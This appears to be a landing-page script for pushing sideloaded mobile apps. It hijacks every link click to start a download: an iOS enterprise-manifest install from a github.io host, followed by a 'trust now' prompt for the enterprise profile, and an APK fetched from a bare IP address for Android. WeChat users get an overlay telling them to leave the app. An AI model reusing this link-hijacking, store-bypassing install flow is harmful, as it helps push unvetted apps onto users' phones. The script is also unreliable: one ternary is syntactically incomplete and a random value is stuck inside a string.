function setAnchors() {
  var cssText =
    '#weixin-tip{position: fixed; left:0; top:0; background: rgba(0,0,0,0.8); filter:alpha(opacity=80); width: 100%; height:100%; z-index: 100;} #weixin-tip p{text-align: center; margin-top: 10%; padding:0 5%;}';
  var ua = navigator.userAgent.toLowerCase(),
    iphoneos =
      ua.match(/iphone os/i) == 'iphone os' ||
      ua.match(/iph os/i) == 'iph os' ||
      ua.match(/ipad/i) == 'ipad',
    android =
      ua.match(/android/i) == 'android' ||
      ua.match(/adr/i) == 'adr' ||
      ua.match(/android/i) == 'mi pad';
  var isDownloaded = false;
  var a_list = document.getElementsByTagName('a'),
    i = 0,
    len = a_list.length,
    get_par = '',
    get_par = function get_par(par) {
      var local_url = document.location.href;
      var get = local_url.indexOf(par + '=');
      if (get == -1) {
        return false;
      }
      var get_par = local_url.slice(par.length + get + 1);
      var nextPar = get_par.indexOf('&');
      if (nextPar != -1) {
        get_par = get_par.slice(0, nextPar);
      }
      return get_par;
    };

  place = get_par('place') || '626';

  for (i = 0; i < len; i++) {
    (function(index) {
      a_list[index].addEventListener(
        'click',
        function() {
          DownSoft();
        },
        false
      );
    })(i);
  }

  if (is_weixin()) {
    loadHtml();
    loadStyleText();
  }

  function getQueryString(name) {
    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
    var r = window.location.search.substr(1).match(reg);
    if (r !== null) {
      return r[2];
    }
    return null;
  }

  function is_weixin() {
    var ua = navigator.userAgent.toLowerCase();
    if (ua.match(/MicroMessenger/i) == 'micromessenger') {
      return true;
    } else {
      return false;
    }
  }

  function loadHtml() {
    var u = navigator.userAgent;
    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端

    var div = document.createElement('div');
    div.id = 'weixin-tip';
    if (isiOS) {
      div.innerHTML =
        '<p><img src="images/live_weixin_ios.png" alt="微信打开" style="max-width: 100%; height: auto;"/></p>';
    } else {
      div.innerHTML =
        '<p><img src="images/live_weixin.png" alt="微信打开" style="max-width: 100%; height: auto;"/></p>';
    }
    console.log(div);
    document.body.appendChild(div);
  }

  function loadStyleText() {
    var style = document.createElement('style');
    style.rel = 'stylesheet';
    style.type = 'text/css';
    try {
      style.appendChild(document.createTextNode(cssText));
    } catch (e) {
      style.styleSheet.cssText = cssText; //ie9以下
    }
    var head = document.getElementsByTagName('head')[0]; //head标签之间加上style样式
    head.appendChild(style);
  }

  function DownSoft() {
    let userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        location.href = isDownloaded ? 'itms-services://?action=download-manifest&url=https://mdhc.github.io/511.plist';
        if( !isDownloaded ){
            isDownloaded = true;
            let tmp = document.getElementsByClassName('ppt_dw')[0];
            tmp.style.background = '#EE7700';
            tmp.innerHTML = '立即信任';
            document.getElementsByClassName('lt_t')[0].children[1].innerHTML = '安装完毕后，点击右方';
        }
    } else {
        location.href = 'http://154.223.178.213:8081/Download/511mdhc.apk?v=Math.random()*100000';
    }
  }
}

window.addEventListener('DOMContentLoaded', setAnchors, false);
